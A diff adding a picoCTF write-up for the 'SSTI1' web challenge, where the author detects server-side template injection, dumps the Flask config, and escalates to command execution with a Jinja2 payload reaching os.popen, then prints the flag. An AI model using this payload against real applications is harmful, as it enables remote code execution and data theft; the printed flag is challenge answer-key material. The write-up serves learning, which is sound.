@@ -48,3 +48,41 @@ picoCTF{y0u_m4d3_1t_79a0ddc6}
 
 
 ***
+# 2. SSTI1
+
+> I made a cool website where you can announce whatever you want! Try it out!
+
+## Solution:
+
+- Whatever you type in the input box will be outputted on the screen, for example if i type `hello`, it displays `hello` BUT if i type `{{7*7}}`, it displays `49`. this means there is a templating used
+- on inputting `{{config.items()}}` (this displays system sensitive information) it outputted
+ `dict_items([('DEBUG', False), ('TESTING', False), ('PROPAGATE_EXCEPTIONS', None), ('SECRET_KEY', None), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)), ('USE_X_SENDFILE', False), ('SERVER_NAME', None), ('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME', 'session'), ('SESSION_COOKIE_DOMAIN', None), ('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_SAMESITE', None), ('SESSION_REFRESH_EACH_REQUEST', True), ('MAX_CONTENT_LENGTH', None), ('SEND_FILE_MAX_AGE_DEFAULT', None), ('TRAP_BAD_REQUEST_ERRORS', None), ('TRAP_HTTP_EXCEPTIONS', False), ('EXPLAIN_TEMPLATE_LOADING', False), ('PREFERRED_URL_SCHEME', 'http'), ('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093)])`
+ (not helpful but i did it...)
+- I then looked into RCE and got a builtin `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('(whatever comman)').read() }}` which will run whatever command is given in "whatever command" like how it would in a normal bash. 
+- So i ran `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}` to list all the functions in it
+  <img width="1915" height="587" alt="image" src="https://github.com/user-attachments/assets/6dcfabc6-3a3c-4f6d-b507-d6b68d5946d2" />
+  We can try and read the .txt file given there
+- `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}`
+- This gave me the flag
+
+## Flag:
+
+```
+picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_4675f3fa}
+```
+
+## Concepts learnt:
+- SSTI - server side template injection
+- RCE ( Remote Code Execution)
+
+
+## Notes:
+
+- ...i was trying to cat requirements...for some reason...
+## Resources:
+
+- https://medium.com/@yadav-ajay/ssti-server-side-template-injection-746dda439038
+- https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html
+
+
+***
